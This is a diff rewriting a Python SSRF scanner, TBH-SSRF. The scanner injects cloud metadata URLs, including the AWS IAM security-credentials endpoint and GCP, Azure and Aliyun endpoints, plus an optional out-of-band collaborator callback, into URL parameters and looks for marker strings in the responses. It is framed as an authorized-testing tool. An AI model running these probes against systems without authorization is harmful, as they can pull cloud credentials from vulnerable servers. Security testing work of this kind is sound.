@@ -1,43 +1,162 @@
 #!/usr/bin/env python3
-# TBH-SSRF - Detector (Educational - Use Burp Collaborator)
-import requests, argparse, json, urllib.parse
+"""TBH-SSRF v3 - Server-Side Request Forgery signal detector (authorized testing only).
 
-BANNER = """\033[91m╔════════════════════════════════════╗
-\033[91m║ \033[97mTBH-SSRF \033[91m- Detector               \033[91m║
-\033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
-\033[91m╚════════════════════════════════════╝\033[0m"""
+Default probes target cloud metadata endpoints. Point --collab at Burp
+Collaborator / interactsh for out-of-band confirmation.
+"""
+import argparse, json, os, sys, time, urllib.parse
 
-def check(url, collaborator="http://169.254.169.254/latest/meta-data/"):
-    parsed=urllib.parse.urlparse(url)
-    qs=urllib.parse.parse_qs(parsed.query)
-    if not qs:
-        test_url=f"{url}?url={urllib.parse.quote(collaborator)}"
-    else:
-        k=list(qs.keys())[0]
-        qs[k]=collaborator
-        test_url=urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)))
+try:
+    import requests
+except ImportError:
+    print("[!] requests required: pip install requests", file=sys.stderr)
+    sys.exit(2)
+
+VERSION = "3.0"
+REPO = "https://github.com/TulungagungBlackHat/TBH-SSRF"
+
+def banner():
+    if os.environ.get("NO_COLOR"):
+        return ""
+    return ("\033[91m╔════════════════════════════════════╗\n"
+            "║ \033[97mTBH-SSRF v3\033[91m - Metadata + OOB      \033[91m║\n"
+            "║ \033[90mTulungagung Black Hat | uchil404 \033[91m║\n"
+            "╚════════════════════════════════════╝\033[0m")
+
+def color(code, text, enabled=True):
+    return f"\033[{code}m{text}\033[0m" if enabled else text
+
+METADATA_PROBES = [
+    ("http://169.254.169.254/latest/meta-data/", ["meta-data", "ami-id", "instance-id"], "aws-legacy"),
+    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "Signature"], "aws-iam"),
+    ("http://metadata.google.internal/computeMetadata/v1/", ["computeMetadata", "instance"], "gcp"),
+    ("http://100.100.100.200/latest/meta-data/", ["meta-data"], "aliyun"),
+    ("http://169.254.169.254/metadata/instance", ["compute", "subscriptionId"], "azure"),
+]
+PARAM_CANDIDATES = ["url", "uri", "link", "dest", "destination", "redirect", "redirect_uri",
+                    "callback", "next", "feed", "site", "image", "img", "src", "path", "page"]
+
+def build_session(args):
+    s = requests.Session()
+    s.headers["User-Agent"] = f"TBH-SSRF/{VERSION} (+{REPO})"
+    if args.cookie:
+        s.headers["Cookie"] = args.cookie
+    for h in args.header or []:
+        name, _, val = h.partition(":")
+        if not val:
+            raise SystemExit(f"[!] bad -H value: {h!r}")
+        s.headers[name.strip()] = val.strip()
+    if args.proxy:
+        s.proxies = {"http": args.proxy, "https": args.proxy}
+    return s
+
+def inject(url, param, value):
+    p = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
+    if param is None:
+        param = next((c for c in PARAM_CANDIDATES if c in qs), next(iter(qs), "url"))
+    qs[param] = [value]
+    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs, doseq=True))), param
+
+def target_params(url, requested):
+    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query, keep_blank_values=True)
+    if requested and requested != "all":
+        return [requested]
+    return list(qs.keys()) or ["url"]
+
+def scan(session, url, args):
+    findings = []
+    params = target_params(url, args.param)
+    probes = list(METADATA_PROBES)
+    if args.collab:
+        probes.insert(0, (args.collab, [], "collab-oob"))
+
     try:
-        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-SSRF/1.0'})
-        # Simple heuristic: if response contains metadata or 200 with collaborator
-        vulnerable="meta-data" in r.text.lower() or collaborator in r.text
-        return {"url":test_url,"status":r.status_code,"vulnerable":vulnerable,"length":len(r.text)}
-    except Exception as e:
-        return {"url":test_url,"error":str(e),"vulnerable":False}
+        b = session.get(url, timeout=args.timeout, allow_redirects=True)
+        baseline = {"status": b.status_code, "length": len(b.text)}
+    except requests.RequestException as e:
+        return {"error": f"baseline failed: {e}"}
+
+    for param in params:
+        for payload, markers, kind in probes:
+            test_url, _ = inject(url, param, payload)
+            try:
+                r = session.get(test_url, timeout=args.timeout, allow_redirects=False)
+            except requests.RequestException as e:
+                findings.append({"param": param, "payload": payload, "error": str(e), "verdict": "error"})
+                continue
+            hit = any(m.lower() in r.text.lower() for m in markers) if markers else False
+            reflected = payload in r.text
+            if hit:
+                findings.append({"param": param, "payload": payload, "url": test_url, "kind": kind,
+                                 "status": r.status_code, "markers": markers, "verdict": "ssrf"})
+            elif reflected and kind == "collab-oob":
+                findings.append({"param": param, "payload": payload, "url": test_url, "kind": kind,
+                                 "status": r.status_code, "verdict": "reflected",
+                                 "note": "callback URL reflected in response - check collaborator"})
+            if args.delay:
+                time.sleep(args.delay)
+
+    return {"tool": "TBH-SSRF", "version": VERSION, "target": url,
+            "baseline": baseline, "findings": findings}
 
 def main():
-    print(BANNER)
-    print("\033[91m[!] Hanya untuk scope yang diizinkan! Gunakan Burp Collaborator untuk PoC real!\033[0m\n")
-    parser=argparse.ArgumentParser(description="SSRF")
-    parser.add_argument("-u","--url",required=True,help="URL dengan param ?url=")
-    parser.add_argument("--json",help="Save JSON")
-    args=parser.parse_args()
-    print(f"[*] Testing {args.url} dengan payload metadata")
-    result=check(args.url)
-    if result.get("vulnerable"):
-        print(f"\033[91m[!] Potensi SSRF! {result['url']} -> {result['status']}\033[0m")
-    else:
-        print(f"\033[92m[✓] Tidak terdeteksi SSRF [{result.get('status')}] - butuh collaborator real\033[0m")
-    if args.json:
-        open(args.json,'w').write(json.dumps(result,indent=2)); print(f"[✓] JSON: {args.json}")
+    parser = argparse.ArgumentParser(description=f"TBH-SSRF v{VERSION} - SSRF signal detector")
+    parser.add_argument("-u", "--url", required=True, help="URL whose parameter accepts a URL")
+    parser.add_argument("--param", help="parameter name, or 'all' (default: auto-detect url-ish param)")
+    parser.add_argument("--collab", help="OOB callback URL (Burp Collaborator / interactsh)")
+    parser.add_argument("--proxy", help="e.g. http://127.0.0.1:8080 (Burp)")
+    parser.add_argument("--cookie", help="Cookie header value")
+    parser.add_argument("-H", "--header", action="append", help="extra header, repeatable")
+    parser.add_argument("--timeout", type=float, default=10.0)
+    parser.add_argument("--delay", type=float, default=0.0)
+    parser.add_argument("--json", help="save JSON report")
+    parser.add_argument("--no-color", action="store_true")
+    parser.add_argument("--version", action="version", version=f"TBH-SSRF {VERSION}")
+    args = parser.parse_args()
+    print(banner())
 
-if __name__=="__main__": main()
+    use_color = not args.no_color and not os.environ.get("NO_COLOR")
+    print(color("91", "[!] Authorized targets only. Metadata probes are safe reads; OOB needs your collaborator.", use_color))
+    if not args.collab:
+        print(color("93", "[i] Tip: --collab https://xyz.burpcollaborator.net for out-of-band proof", use_color))
+    print(f"[*] Scanning {args.url}")
+    try:
+        session = build_session(args)
+    except SystemExit as e:
+        print(e, file=sys.stderr)
+        sys.exit(2)
+
+    report = scan(session, args.url, args)
+    if "error" in report:
+        print(color("91", f"[!] {report['error']}", use_color))
+        sys.exit(2)
+
+    vuln = 0
+    for f in report["findings"]:
+        if f.get("verdict") == "ssrf":
+            vuln += 1
+            print(color("91", f"[!] SSRF signal on {f['param']}: kind={f['kind']} markers={f['markers']}", use_color))
+        elif f.get("verdict") == "reflected":
+            print(color("96", f"[*] {f['param']}: {f.get('note', '')}", use_color))
+        elif f.get("verdict") == "error":
+            print(color("90", f"[-] {f['param']}: {f['error']}", use_color))
+
+    if args.json:
+        report["summary"] = {"ssrf_signals": vuln}
+        try:
+            with open(args.json, "w") as fh:
+                json.dump(report, fh, indent=2)
+            print(f"[✓] JSON: {args.json}")
+        except OSError as e:
+            print(color("91", f"[!] cannot write JSON: {e}", use_color), file=sys.stderr)
+            sys.exit(2)
+
+    if vuln:
+        print(color("91", f"[!] {vuln} SSRF signal(s) - confirm with collaborator before reporting", use_color))
+        sys.exit(1)
+    print(color("92", "[✓] No SSRF signals (use --collab for OOB confirmation)", use_color))
+    sys.exit(0)
+
+if __name__ == "__main__":
+    main()
